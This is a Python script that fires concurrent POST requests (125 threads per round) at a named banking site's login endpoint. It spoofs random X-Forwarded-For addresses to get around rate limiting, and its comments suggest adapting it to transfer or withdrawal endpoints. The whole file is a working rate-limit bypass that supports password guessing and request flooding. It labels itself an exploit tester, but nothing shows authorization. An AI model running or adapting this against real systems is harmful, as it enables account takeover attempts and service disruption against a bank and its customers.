import requests
import random

# Target endpoint (update according to the action, e.g., /login, /transfer etc.)
target_url = "https://www.nmlbanking.com/login"

# POST data for your target endpoint. Change fields to match your actual use (e.g., login, transfer, withdrawal, etc.)
post_data = {
    "username": "alice",
    "password": "wrongpassword"
}

# Session to keep cookies (if needed for authentication/consistency)
session = requests.Session()

# Attempt multiple requests with different X-Forwarded-For IP addresses
for i in range(10):  # Change 30 to the number of requests you want
    # Generate a random IP or rotate from a list
    fake_ip = f"192.168.1.{random.randint(10, 250)}"
    headers = {
        "X-Forwarded-For": fake_ip,
        "User-Agent": "RateLimit-Exploit-Tester"
    }

    from concurrent.futures import ThreadPoolExecutor

    def fetch(url):
        with requests.Session() as session:
            resp = session.post(url, data=post_data, headers=headers)
            print(f"X-Forwarded-For: {fake_ip}: Status {resp.status_code}")
            # print(resp.text[:1000])

    with ThreadPoolExecutor(max_workers=125) as executor:
        results = list(executor.map(fetch, [target_url]*125))

    print(results)

    # resp = session.post(target_url, data=post_data, headers=headers)
    # print(f"Attempt {i+1} with X-Forwarded-For: {fake_ip}: Status {resp.status_code}")
    # print(resp.text[:1000])  # Optionally print first 100 chars of response

print("Finished rate-limit bypass attempts.")
